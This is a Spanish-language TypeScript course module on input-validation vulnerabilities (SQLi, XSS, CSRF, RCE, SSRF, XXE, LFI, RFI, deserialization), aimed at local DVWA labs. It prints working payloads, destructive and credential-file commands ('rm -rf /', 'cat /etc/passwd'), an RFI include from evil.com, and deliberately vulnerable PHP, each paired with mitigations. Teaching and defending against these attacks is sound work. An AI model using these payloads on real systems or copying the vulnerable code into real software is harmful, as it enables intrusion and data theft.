import type { Module } from './index'

export const modulo2: Module = {
  id: 'modulo-2',
  number: 2,
  title: 'Vulnerabilidades de Datos de Entrada',
  description: 'SQLi, XSS, CSRF, RCE, SSRF, XXE, LFI, RFI y más',
  icon: 'bug',
  lessons: [
    {
      id: 'm2-sqli',
      title: 'SQL Injection (SQLi)',
      slug: 'sql-injection',
      objectives: [
        'Comprender cómo funciona SQL Injection',
        'Explotar vulnerabilidades SQLi en laboratorio',
        'Implementar mitigaciones con prepared statements'
      ],
      keyPoints: [
        'Inyección de código SQL malicioso en consultas',
        'Bypass de autenticación con \' OR \'1\'=\'1',
        'Mitigación: consultas parametrizadas (prepared statements)'
      ],
      theory: `
## ¿Qué es SQL Injection?

**SQL Injection** es una vulnerabilidad que permite a un atacante **inyectar código SQL malicioso** en las consultas que una aplicación envía a la base de datos. Ocurre cuando la aplicación concatena directamente la entrada del usuario en la cadena SQL, sin validación ni escape.

### Impacto
- Bypass de autenticación
- Lectura de datos sensibles (credenciales, datos personales)
- Modificación o eliminación de datos
- En algunos casos, ejecución de comandos en el servidor (con permisos elevados)

## Código Vulnerable

\`\`\`php
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($query);
if ($result->num_rows > 0) {
    // Login exitoso
}
\`\`\`

El problema: si el usuario introduce \`admin' --\`, la consulta se convierte en:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
\`\`\`
El \`--\` comenta el resto, ignorando la verificación de contraseña.

## Ataque Clásico: Bypass de Autenticación

**Payload**: \`' OR '1'='1' #\`

La consulta resultante:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' #' AND password = '...'
\`\`\`

La condición \`'1'='1'\` es siempre verdadera, por lo que la consulta devuelve todas las filas. El \`#\` comenta el resto en MySQL.

## Otros Tipos de SQLi

### Union-based
Usar \`UNION SELECT\` para extraer datos de otras tablas:
\`\`\`
' UNION SELECT username, password FROM users --
\`\`\`

### Error-based
Provocar errores que revelen información de la base de datos.

### Blind (ciega)
La aplicación no devuelve datos directamente, pero el atacante puede inferir información por diferencias en el comportamiento (tiempo de respuesta, mensajes).

## Código Seguro: Prepared Statements

\`\`\`php
<?php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
\`\`\`

Los placeholders \`?\` aseguran que la entrada se trate como **datos**, nunca como código. La base de datos interpreta el valor literalmente, sin ejecutar SQL inyectado.

### Nota sobre contraseñas
En producción, **nunca** almacenes contraseñas en texto plano. Usa \`password_hash()\` y \`password_verify()\` con bcrypt o Argon2.
      `,
      codeExamples: [
        {
          title: 'Código vulnerable (NUNCA usar)',
          code: `$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($query);`,
          language: 'php'
        },
        {
          title: 'Código seguro (Prepared Statements)',
          code: `$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();`,
          language: 'php'
        }
      ],
      activity: {
        title: 'Explotación y Mitigación de SQL Injection',
        objective: 'Configurar servidor Apache+PHP+MySQL, explotar SQLi y corregirla con prepared statements',
        labId: 'lab-sqli',
        steps: [
          'Ejecutar: docker compose up -d (incluye Lab SQLi en puerto 8081)',
          'Abrir http://localhost:8081 y probar login con admin / admin123',
          "Intentar bypass con usuario: ' OR '1'='1' # (dejar contraseña vacía o cualquiera)",
          'Revisar el código PHP del lab y localizar la consulta vulnerable',
          'Modificar a prepared statements y verificar que el bypass ya no funciona'
        ]
      }
    },
    {
      id: 'm2-xss',
      title: 'Cross-Site Scripting (XSS)',
      slug: 'xss',
      objectives: [
        'Comprender los tres tipos de XSS',
        'Explotar XSS reflejado y almacenado en DVWA',
        'Implementar sanitización y Content Security Policy'
      ],
      keyPoints: [
        'Reflejado: código en enlace malicioso, se ejecuta al hacer clic',
        'Almacenado: código guardado en BD, afecta a todos los visitantes',
        'DOM-Based: manipulación del DOM en el cliente'
      ],
      theory: `
## ¿Qué es XSS?

**Cross-Site Scripting (XSS)** permite inyectar código JavaScript malicioso que se ejecuta en el navegador de la víctima. El atacante puede robar cookies, sesiones, modificar la página o redirigir al usuario.

## Tipos de XSS

### XSS Reflejado (Stored)
El payload se incluye en la respuesta de la misma petición. Típicamente en parámetros de URL o formularios. La víctima debe hacer clic en un enlace malicioso.

**Ejemplo**: \`https://victima.com/buscar?q=<script>alert(document.cookie)</script>\`

Si la página muestra \`q\` sin escapar, el script se ejecuta.

### XSS Almacenado (Persistent)
El payload se guarda en la base de datos (comentarios, perfiles, mensajes) y se ejecuta cada vez que alguien carga la página. Afecta a múltiples usuarios sin necesidad de engañarlos con un enlace.

### XSS basado en DOM
La vulnerabilidad está en el código JavaScript del cliente. El payload se procesa al manipular el DOM, sin que el servidor "refleje" el input. Más difícil de detectar con escáneres.

## Payloads Comunes

\`\`\`html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"onfocus=alert('XSS') autofocus
\`\`\`

## Mitigación

1. **Escape de salida**: Convertir \`<\` a \`&lt;\`, \`>\` a \`&gt;\`, \`"\` a \`&quot;\`. Usar funciones como \`htmlspecialchars()\` en PHP.

2. **Content Security Policy (CSP)**: Cabecera HTTP que restringe qué scripts pueden ejecutarse. \`Content-Security-Policy: default-src 'self'\` bloquea scripts inline.

3. **DOMPurify**: Librería para sanitizar HTML en el cliente antes de insertarlo en el DOM.

4. **HttpOnly en cookies**: Impide que JavaScript acceda a las cookies de sesión, limitando el robo de sesión vía XSS.
      `,
      activity: {
        title: 'Explotación y Mitigación de XSS',
        objective: 'Explorar XSS reflejado y almacenado en DVWA',
        labId: 'dvwa',
        steps: [
          'Abrir DVWA en http://localhost:4280 (admin / password)',
          'Configurar nivel de seguridad en "Low" en DVWA Security',
          'Ir a XSS Reflected e inyectar <script>alert(1)</script>',
          'Ir a XSS Stored, guardar un comentario con payload y recargar',
          'Implementar htmlspecialchars() o equivalente al mostrar datos de usuario'
        ]
      }
    },
    {
      id: 'm2-csrf',
      title: 'Cross-Site Request Forgery (CSRF)',
      slug: 'csrf',
      objectives: [
        'Comprender el ataque CSRF',
        'Implementar tokens CSRF en formularios',
        'Validar cabeceras Referer y Origin'
      ],
      keyPoints: [
        'Fuerza acciones no deseadas en usuario autenticado',
        'Mitigación: tokens CSRF únicos por sesión',
        'SameSite en cookies previene muchos casos'
      ],
      theory: `
## ¿Qué es CSRF?

**Cross-Site Request Forgery** fuerza al usuario autenticado a ejecutar acciones no deseadas en una aplicación. El atacante aprovecha que el navegador envía automáticamente las cookies de sesión con cada petición al dominio.

### Escenario típico
1. Usuario está logueado en su banco (banco.com).
2. Usuario visita sitio malicioso (evil.com).
3. evil.com contiene \`<img src="https://banco.com/transfer?to=atacante&amount=1000">\`
4. El navegador hace la petición **con las cookies del banco**.
5. La transferencia se ejecuta sin que el usuario haga clic.

## Mitigación

### Tokens CSRF
Incluir un token aleatorio en cada formulario, generado por el servidor y vinculado a la sesión. El atacante no puede conocer el token.

\`\`\`html
<form method="POST">
  <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
  ...
</form>
\`\`\`

El servidor valida que el token recibido coincida con el de la sesión.

### Validar Referer/Origin
Comprobar que la petición provenga del mismo origen. \`Origin\` y \`Referer\` no pueden falsificarse en peticiones cross-origin por políticas del navegador (aunque Referer puede omitirse).

### SameSite en cookies
\`Set-Cookie: session=xxx; SameSite=Strict\` impide que la cookie se envíe en peticiones cross-site. \`SameSite=Lax\` permite GET pero no POST cross-site.
      `,
      activity: {
        title: 'Explotación y Mitigación de CSRF',
        objective: 'Simular ataque CSRF en DVWA y protegerse con tokens',
        labId: 'dvwa',
        steps: [
          'En DVWA, ir a CSRF y cambiar la contraseña (nivel Low)',
          'Observar que la contraseña está en la URL - crear página HTML que cargue esa URL en iframe/img',
          'Con usuario logueado, abrir la página maliciosa y comprobar que la contraseña cambió',
          'Implementar token CSRF en el formulario y verificar que el ataque falla'
        ]
      }
    },
    {
      id: 'm2-rce',
      title: 'Remote Code Execution (RCE)',
      slug: 'rce',
      objectives: [
        'Identificar funciones peligrosas (eval, exec, system)',
        'Explotar RCE en laboratorio',
        'Mitigar con validación estricta y whitelist'
      ],
      keyPoints: [
        'eval(), exec(), system(), passthru() son peligrosas con input de usuario',
        'Control total del servidor',
        'Mitigación: evitar estas funciones con input no confiable'
      ],
      theory: `
## ¿Qué es RCE?

**Remote Code Execution** permite a un atacante ejecutar código arbitrario en el servidor. Suele ocurrir cuando la aplicación pasa entrada del usuario a funciones que ejecutan comandos o código.

## Código Vulnerable en PHP

\`\`\`php
<?php
$cmd = $_GET['cmd'];
system($cmd);
\`\`\`

**Ataque**: \`?cmd=rm -rf /\` o \`?cmd=cat /etc/passwd\`

## Funciones Peligrosas

| Función | Riesgo |
|---------|--------|
| eval() | Ejecuta PHP |
| exec(), system(), passthru(), shell_exec() | Ejecutan comandos del SO |
| preg_replace() con /e | Ejecuta código (deprecado en PHP 7) |
| create_function() | Crea funciones desde string (deprecado) |

## Mitigación

1. **Evitar** pasar input de usuario a estas funciones.
2. **Whitelist**: Si es imprescindible (ej: ping), permitir solo comandos específicos con argumentos validados.
3. **Escaping**: \`escapeshellarg()\` y \`escapeshellcmd()\` en PHP (aún así, preferir evitar).
4. **Sandboxing**: Ejecutar en contenedores con permisos mínimos.
      `,
      activity: {
        title: 'Explotación y Mitigación de RCE',
        objective: 'Explorar RCE en DVWA Command Injection',
        labId: 'dvwa',
        steps: [
          'En DVWA, ir a Command Injection (nivel Low)',
          'Probar input: 127.0.0.1; whoami o 127.0.0.1 && cat /etc/passwd',
          'Identificar que el input se concatena directamente al comando',
          'Implementar whitelist de comandos permitidos (solo ping) y validar la IP'
        ]
      }
    },
    {
      id: 'm2-ssrf',
      title: 'Server-Side Request Forgery (SSRF)',
      slug: 'ssrf',
      objectives: [
        'Comprender SSRF y su impacto',
        'Explotar acceso a recursos internos',
        'Implementar validación y whitelist de URLs'
      ],
      keyPoints: [
        'El servidor hace peticiones a URLs controladas por el atacante',
        'Acceso a localhost, APIs internas, metadatos cloud',
        'Mitigación: validar y restringir URLs permitidas'
      ],
      theory: `
## ¿Qué es SSRF?

En **Server-Side Request Forgery**, el atacante induce al servidor a realizar peticiones HTTP (u otros protocolos) a destinos que el atacante elige. El servidor puede tener acceso a redes internas a las que el atacante no llega directamente.

## Ejemplo de Ataque

\`\`\`
https://victima.com/fetch?url=http://localhost:8080/admin
https://victima.com/fetch?url=http://169.254.169.254/latest/meta-data/  (AWS)
\`\`\`

El servidor hace \`GET\` a esa URL y puede exponer paneles de administración o credenciales de cloud.

## Mitigación

- **Whitelist de dominios**: Solo permitir URLs a dominios conocidos.
- **Bloquear direcciones privadas**: 127.0.0.1, 10.x, 192.168.x, 169.254.169.254.
- **Usar un proxy**: Que el servidor nunca resuelva ni conecte directamente a URLs de usuario.
      `,
      activity: {
        title: 'Explotación y Mitigación de SSRF',
        objective: 'Explorar SSRF en laboratorio',
        labId: 'dvwa',
        steps: [
          'Si hay ejercicio SSRF en DVWA o lab similar, explotar acceso a localhost',
          'Implementar validación de URL: rechazar localhost, IPs privadas, 169.254.x.x',
          'Usar whitelist de dominios permitidos si la funcionalidad lo requiere'
        ]
      }
    },
    {
      id: 'm2-xxe',
      title: 'XML External Entities (XXE)',
      slug: 'xxe',
      objectives: [
        'Comprender el ataque XXE',
        'Leer archivos del servidor mediante entidades externas',
        'Deshabilitar entidades externas en el parser XML'
      ],
      keyPoints: [
        'Parser XML permite cargar entidades externas',
        'Lectura de /etc/passwd, archivos de configuración',
        'Mitigación: deshabilitar entidades externas (libxml_disable_entity_loader)'
      ],
      theory: `
## ¿Qué es XXE?

**XML External Entities** explota la capacidad de XML de cargar entidades definidas en DTDs externos. Si el parser procesa DTDs y entidades externas, un atacante puede leer archivos del servidor.

## Payload XXE

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
\`\`\`

El parser carga el contenido de /etc/passwd en la entidad \`xxe\` y lo incluye en la salida.

## Mitigación

- Deshabilitar entidades externas: \`libxml_disable_entity_loader(true)\` en PHP.
- Usar formatos más seguros: JSON en lugar de XML cuando sea posible.
- Validar y sanitizar el XML de entrada.
      `,
      activity: {
        title: 'Explotación y Mitigación de XXE',
        objective: 'Explorar XXE en laboratorio',
        labId: 'dvwa',
        steps: [
          'Buscar ejercicio XXE en DVWA o PentesterLab',
          'Enviar payload con entidad externa file:///etc/passwd',
          'Configurar el parser XML para deshabilitar entidades externas'
        ]
      }
    },
    {
      id: 'm2-lfi',
      title: 'Local File Inclusion (LFI)',
      slug: 'lfi',
      objectives: [
        'Comprender LFI y path traversal',
        'Leer archivos del servidor',
        'Implementar whitelist de archivos incluibles'
      ],
      keyPoints: [
        'include/require con variable de usuario',
        'Path traversal: ../../../../etc/passwd',
        'Mitigación: whitelist, sin input de usuario en rutas'
      ],
      theory: `
## ¿Qué es LFI?

**Local File Inclusion** ocurre cuando la aplicación incluye archivos usando una ruta controlada por el usuario. Con \`../\` (path traversal) el atacante puede salir del directorio previsto y leer archivos arbitrarios.

## Código Vulnerable

\`\`\`php
<?php
$page = $_GET['page'];
include("/var/www/pages/" . $page . ".php");
\`\`\`

**Ataque**: \`?page=../../../../etc/passwd%00\` (null byte en PHP antiguo) o \`?page=....//....//....//etc/passwd\`

## Mitigación

- **Whitelist**: Solo permitir nombres de archivo conocidos (ej: mapa de "page" a archivos).
- **Basename**: \`basename($page)\` para eliminar path traversal (aún así, validar contra whitelist).
- **Evitar** incluir archivos basados en input de usuario cuando sea posible.
      `,
      activity: {
        title: 'Explotación y Mitigación de LFI',
        objective: 'Leer archivos del servidor y mitigar',
        labId: 'dvwa',
        steps: [
          'En DVWA File Inclusion (Low), probar ?page=../../../../etc/passwd',
          'Identificar el include vulnerable',
          'Implementar whitelist: solo permitir page=include1, include2, include3'
        ]
      }
    },
    {
      id: 'm2-rfi',
      title: 'Remote File Inclusion (RFI)',
      slug: 'rfi',
      objectives: [
        'Comprender RFI',
        'Ejecutar código remoto',
        'Deshabilitar allow_url_include en PHP'
      ],
      keyPoints: [
        'Inclusión de archivos desde URLs remotas',
        'Ejecución de webshells alojados por el atacante',
        'Mitigación: allow_url_include=Off'
      ],
      theory: `
## ¿Qué es RFI?

**Remote File Inclusion** es similar a LFI pero el include puede cargar archivos desde URLs. Si \`allow_url_include\` está activo en PHP, el atacante puede incluir un script malicioso alojado en su servidor.

## Ataque

\`\`\`
?page=http://evil.com/shell.txt
\`\`\`

shell.txt contiene código PHP. Al incluirlo, se ejecuta en el servidor.

## Mitigación

- **allow_url_include = Off** en php.ini (por defecto en PHP 5.2+).
- **allow_url_fopen = Off** si no se necesita (más restrictivo).
- Whitelist de archivos locales como en LFI.
      `,
      activity: {
        title: 'Explotación y Mitigación de RFI',
        objective: 'Explorar RFI (requiere PHP con allow_url_include)',
        labId: 'dvwa',
        steps: [
          'En entornos educativos con RFI habilitado, probar inclusión de URL remota',
          'Documentar que allow_url_include debe estar Off en producción'
        ]
      }
    },
    {
      id: 'm2-deserialization',
      title: 'Unsafe Deserialization',
      slug: 'unsafe-deserialization',
      objectives: [
        'Comprender deserialización insegura',
        'Explotar objetos maliciosos (PHP Object Injection)',
        'Usar JSON en lugar de serialize'
      ],
      keyPoints: [
        'unserialize() sin validación ejecuta métodos mágicos',
        'Objetos con __destruct, __wakeup pueden ejecutar código',
        'Mitigación: JSON, validación estricta, whitelist de clases'
      ],
      theory: `
## ¿Qué es Unsafe Deserialization?

Al deserializar datos no confiables, el parser puede instanciar objetos y ejecutar métodos "mágicos" (__wakeup, __destruct, __toString, etc.). Un atacante puede crear un payload serializado que, al deserializarse, ejecute código.

## Código Vulnerable

\`\`\`php
$data = unserialize($_POST['data']);
\`\`\`

## Mitigación

- **Usar JSON**: \`json_decode()\` no ejecuta código.
- **Validación**: Si se debe usar serialize, validar estrictamente y usar allowed_classes en unserialize (ver documentación PHP).
- Evitar deserializar input de usuario cuando sea posible.
      `,
      activity: {
        title: 'Explotación y Mitigación de Unsafe Deserialization',
        objective: 'Explorar PHP Object Injection',
        labId: 'dvwa',
        steps: [
          'Buscar ejercicios de deserialización (OWASP WebGoat, etc.)',
          'Crear clase con __destruct que ejecute código',
          'Serializar objeto malicioso y enviarlo',
          'Migrar a json_encode/json_decode'
        ]
      }
    }
  ]
}
